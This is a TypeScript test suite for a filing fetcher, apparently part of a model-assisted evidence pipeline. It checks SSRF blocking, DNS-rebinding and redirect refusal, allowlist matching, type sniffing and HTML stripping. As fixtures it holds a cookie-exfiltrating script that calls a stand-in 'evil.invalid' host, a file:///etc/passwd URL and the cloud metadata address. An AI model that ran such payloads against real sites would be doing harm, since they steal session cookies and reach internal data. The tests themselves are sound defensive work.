import { test } from "node:test";
import assert from "node:assert/strict";
import {
  buildAllowlist, classifyTier, decodeEntities, defaultHtmlExtractor, fetchDocument, FetchRefused,
  isAllowedHost, isBlockedAddress, sniffType, type FetchDeps, type HttpResponse,
} from "./fetch.ts";
import { gate } from "./anchor.ts";

const ALLOW = buildAllowlist([
  "https://northco.invalid/investors", "royalco.invalid", "www.sedar-plus.invalid",
]);

const bytes = (s: string) => new TextEncoder().encode(s);

async function deps(over: Partial<FetchDeps> & { responses?: Record<string, HttpResponse> } = {}): Promise<FetchDeps> {
  const responses = over.responses ?? {};
  return {
    resolve: over.resolve ?? (async () => ["93.184.216.34"]),
    http: over.http ?? (async (url) => {
      const r = responses[url];
      if (!r) throw new Error(`no stub for ${url}`);
      return r;
    }),
    extractors: over.extractors,
    now: () => new Date("2026-09-04T00:00:00.000Z"),
  };
}

const ok = (body: string, contentType = "text/html"): HttpResponse =>
  ({ status: 200, headers: { "content-type": contentType }, body: bytes(body) });

// ------------------------------------------------------------------- SSRF

test("private, loopback and link-local address space is blocked", async () => {
  for (const ip of [
    "127.0.0.1", "10.0.0.5", "192.168.1.1", "172.16.0.1", "172.31.255.255",
    "169.254.169.254",           // the cloud metadata endpoint
    "0.0.0.0", "100.64.0.1", "224.0.0.1", "::1", "fe80::1", "fd00::1",
    "::ffff:127.0.0.1",          // IPv4-mapped loopback
    "not-an-ip",
  ]) {
    assert.equal(isBlockedAddress(ip), true, `${ip} must be blocked`);
  }
  for (const ip of ["93.184.216.34", "8.8.8.8", "172.32.0.1", "2606:2800:220:1::1"]) {
    assert.equal(isBlockedAddress(ip), false, `${ip} must be allowed`);
  }
});

test("a hostname that resolves into private space is refused after resolution", async () => {
  // The classic bypass: an allowlisted name whose DNS answer points at the
  // metadata endpoint. Checking the hostname alone would let this through.
  await assert.rejects(
    fetchDocument("https://northco.invalid/aif.html", ALLOW,
      await deps({ resolve: async () => ["169.254.169.254"] })),
    (e: FetchRefused) => e.code === "private_address");
});

test("a redirect into private space is refused exactly as a direct request is", async () => {
  const responses = {
    "https://northco.invalid/doc": {
      status: 302, headers: {}, body: new Uint8Array(),
      location: "https://northco.invalid/internal",
    } as HttpResponse,
    "https://northco.invalid/internal": ok("<html>secret</html>"),
  };
  let call = 0;
  await assert.rejects(
    fetchDocument("https://northco.invalid/doc", ALLOW, await deps({
      responses,
      resolve: async () => (++call === 1 ? ["93.184.216.34"] : ["10.0.0.1"]),
    })),
    (e: FetchRefused) => e.code === "private_address");
});

test("a redirect off the allowlist is refused", async () => {
  const responses = {
    "https://northco.invalid/doc": {
      status: 302, headers: {}, body: new Uint8Array(),
      location: "https://elsewhere.invalid/doc",
    } as HttpResponse,
  };
  await assert.rejects(
    fetchDocument("https://northco.invalid/doc", ALLOW, await deps({ responses })),
    (e: FetchRefused) => e.code === "host_not_allowed");
});

// -------------------------------------------------------------- allowlist

test("the allowlist matches on label boundaries, not on suffix", async () => {
  assert.equal(isAllowedHost("northco.invalid", ALLOW), true);
  assert.equal(isAllowedHost("www.northco.invalid", ALLOW), true);
  assert.equal(isAllowedHost("ir.northco.invalid", ALLOW), true);
  // The lookalike a naive endsWith would accept.
  assert.equal(isAllowedHost("evil-northco.invalid", ALLOW), false);
  assert.equal(isAllowedHost("northco.invalid.evil.test", ALLOW), false);
});

test("a domain the model proposed is not fetchable on that basis", async () => {
  await assert.rejects(
    fetchDocument("https://model-suggested.invalid/fees.pdf", ALLOW, await deps()),
    (e: FetchRefused) => {
      assert.equal(e.code, "host_not_allowed");
      assert.match(e.message, /never fetched on that basis/);
      return true;
    });
});

// --------------------------------------------------------- type sniffing

test("type is sniffed from the bytes, never from the declared type", async () => {
  assert.equal(sniffType(bytes("%PDF-1.7\nstuff"), "text/html"), "pdf");
  assert.equal(sniffType(bytes("<!DOCTYPE html><html>"), "application/pdf"), "html");
  assert.equal(sniffType(bytes("plain report text, no markup at all"), "text/plain"), "text");
});

test("content declared as PDF whose bytes are not a PDF is refused", async () => {
  await assert.rejects(
    fetchDocument("https://northco.invalid/fees.pdf", ALLOW, await deps({
      responses: {
        "https://northco.invalid/fees.pdf": {
          status: 200, headers: { "content-type": "application/pdf" },
          body: new Uint8Array([0x00, 0x01, 0x02, 0x03, 0x04, 0x05]),
        },
      },
    })),
    (e: FetchRefused) => e.code === "type_confusion");
});

test("a PDF with no extractor supplied is refused rather than guessed at", async () => {
  await assert.rejects(
    fetchDocument("https://northco.invalid/aif.pdf", ALLOW, await deps({
      responses: {
        "https://northco.invalid/aif.pdf": {
          status: 200, headers: { "content-type": "application/pdf" },
          body: bytes("%PDF-1.7\nbinary"),
        },
      },
    })),
    (e: FetchRefused) => e.code === "no_pdf_extractor");
});

// ---------------------------------------------------------- extraction

test("scripts and styles never reach the stored text", async () => {
  const e = defaultHtmlExtractor(bytes(
    `<html><head><style>.a{color:red}</style>
     <script>fetch('https://evil.invalid?c='+document.cookie)</script></head>
     <body><h1>Audit fees</h1><p>412 in thousands</p></body></html>`));
  assert.ok(!e.text.includes("evil.invalid"), "an embedded script must be stripped");
  assert.ok(!e.text.includes("color:red"));
  assert.match(e.text, /Audit fees/);
  assert.match(e.text, /412 in thousands/);
});

test("a fetched document is keyed by hash and stores text, never the file", async () => {
  const html = "<html><body><h1>Auditor's Fees</h1><p>Audit fees 412</p></body></html>";
  const doc = await fetchDocument("https://northco.invalid/circular.html", ALLOW,
    await deps({ responses: { "https://northco.invalid/circular.html": ok(html) } }));

  assert.match(doc.contentHash, /^sha256:[0-9a-f]{64}$/);
  assert.equal(doc.docType, "html");
  assert.match(doc.text, /Audit fees 412/);
  assert.ok(!("body" in doc), "the raw file is never carried forward");
  assert.equal(doc.extractor, "html-strip");
  assert.equal(doc.normalizationVersion, "1.0.0");
  assert.equal(doc.finalUrl, "https://northco.invalid/circular.html");
});

test("every character reference is decoded, so a quote from an SEC exhibit anchors", async () => {
  // Run 1, pass 2: stored as "Company&#8217;s", quoted as "Company’s", and
  // every true quote from an HTML filing failed the gate.
  assert.equal(decodeEntities("Company&#8217;s &#x2019; &rsquo; A&amp;B &nbsp;x"), "Company’s ’ ’ A&B  x");
  assert.equal(decodeEntities("Montr&eacute;al, Qu&eacute;bec"), "Montréal, Québec");
  assert.equal(decodeEntities("&unknownthing; &#0; &#99999999;"), "&unknownthing; &#0; &#99999999;",
    "what cannot be decoded is left as written, never guessed");

  const html = "<html><body><p>The Company&#8217;s head and registered office is located at " +
               "145&#160;King Street East, Toronto, Ontario</p><p>&lt;script&gt;alert(1)&lt;/script&gt;</p></body></html>";
  const doc = await fetchDocument("https://northco.invalid/aif.htm", ALLOW,
    await deps({ responses: { "https://northco.invalid/aif.htm": ok(html) } }));
  assert.match(doc.text, /Company’s head and registered office/);
  assert.equal(doc.extractorVersion, "1.1.0");
  const verdict = gate({ fieldKey: "head_office_location", document: doc,
    excerpt: "The Company's head and registered office is located at 145 King Street East, Toronto" });
  assert.equal(verdict.state, "proposed");
  assert.equal(verdict.anchor.mode, "exact_normalized");
  // An encoded tag in the text is decoded after the markup is gone: it is text, not markup.
  assert.equal(defaultHtmlExtractor(bytes("<p>&lt;b&gt;x&lt;/b&gt;</p>")).text, "<b>x</b>");
});

test("the same filing read by a better reader is a new document, not a rewrite of the old one", async () => {
  const html = "<html><body>Company&#8217;s</body></html>";
  const url = "https://northco.invalid/a.html";
  const one = await fetchDocument(url, ALLOW, await deps({ responses: { [url]: ok(html) } }));
  const two = await fetchDocument(url, ALLOW, await deps({ responses: { [url]: ok(html) },
    extractors: { html: (b) => ({ ...defaultHtmlExtractor(b), extractorVersion: "9.9.9" }) } }));
  assert.notEqual(one.contentHash, two.contentHash,
    "an earlier finding keeps the exact text it was checked against");
});

test("the same bytes always produce the same hash, so the cache is stable", async () => {
  const html = "<html><body>identical</body></html>";
  const one = await fetchDocument("https://northco.invalid/a.html", ALLOW,
    await deps({ responses: { "https://northco.invalid/a.html": ok(html) } }));
  const two = await fetchDocument("https://royalco.invalid/b.html", ALLOW,
    await deps({ responses: { "https://royalco.invalid/b.html": ok(html) } }));
  assert.equal(one.contentHash, two.contentHash);
});

test("a scanned filing is marked as having no text layer before it is used", async () => {
  const extractors = {
    pdf: () => ({ text: "  \n ", pageCount: 40, extractor: "pdf", extractorVersion: "1.0.0" }),
  };
  const doc = await fetchDocument("https://northco.invalid/scan.pdf", ALLOW, await deps({
    extractors,
    responses: {
      "https://northco.invalid/scan.pdf": {
        status: 200, headers: { "content-type": "application/pdf" },
        body: bytes("%PDF-1.7\nscanned"),
      },
    },
  }));
  assert.equal(doc.hasTextLayer, false);
  assert.ok(doc.charsPerPage < 100);
});

test("an oversized page count is refused", async () => {
  const extractors = {
    pdf: () => ({ text: "x".repeat(50_000), pageCount: 900,
                  extractor: "pdf", extractorVersion: "1.0.0" }),
  };
  await assert.rejects(
    fetchDocument("https://northco.invalid/huge.pdf", ALLOW, await deps({
      extractors,
      responses: {
        "https://northco.invalid/huge.pdf": {
          status: 200, headers: { "content-type": "application/pdf" },
          body: bytes("%PDF-1.7\nhuge"),
        },
      },
    })),
    (e: FetchRefused) => e.code === "too_many_pages");
});

test("only http and https are fetchable", async () => {
  for (const url of ["file:///etc/passwd", "ftp://northco.invalid/x", "gopher://x/"]) {
    await assert.rejects(fetchDocument(url, ALLOW, await deps()),
      (e: FetchRefused) => e.code === "scheme" || e.code === "malformed_url");
  }
});

test("source tier is computed from the resolved host, not asked of the model", async () => {
  assert.equal(classifyTier("www.sec.gov", ALLOW), 1);
  assert.equal(classifyTier("northco.invalid", ALLOW), 2);
  assert.equal(classifyTier("www.tsx.com", ALLOW), 3);
  assert.equal(classifyTier("somenews.invalid", ALLOW), 4);
});

// ------------------------------------------------- allowlist from the extract

test("the allowlist is derived from the extract, and page titles are ignored", async () => {
  const { seedFixtureDatabase } = await import("../../../tests/cassettes/build_cassettes.mjs");
  const { allowlistFromPeriod, storeDocument } = await import("./worker.ts");
  const { db, periodId, companies } = seedFixtureDatabase() as any;

  const put = (companyId: string, value: string) =>
    db.run(`insert into company_period_field_values
         (period_id, company_id, field_key, value, source, evidence_state)
       values (?, ?, 'website', ?, 'extract', 'asserted')`, periodId, companyId, JSON.stringify(value));

  await put(companies[0].id, "https://northco.invalid/investors");
  // 45 of 143 real values are page titles rather than URLs. A title is not a
  // domain and must not widen what the fetcher will reach.
  await put(companies[1].id, "Royalco Streaming Inc. | Official Site");

  const allow = await allowlistFromPeriod(db, periodId);
  assert.equal(isAllowedHost("northco.invalid", await allow), true);
  assert.equal(isAllowedHost("royalco.invalid", await allow), false,
    "a page title must not become a fetchable domain");
  assert.equal(allow.size, 1);

  // And a fetched document round-trips into the cache, text only.
  const doc = await fetchDocument("https://northco.invalid/x.html", await allow,
    await deps({ responses: { "https://northco.invalid/x.html": ok("<html><body>Audit fees 412</body></html>") } }));
  const hash = await storeDocument(db, doc);
  const stored = await db.get("select text_content, has_text_layer, source_tier from documents where content_hash = ?", hash) as any;
  assert.match(stored.text_content, /Audit fees 412/);
  assert.equal(stored.source_tier, 2, "issuer-hosted is tier 2");
  db.close();
});
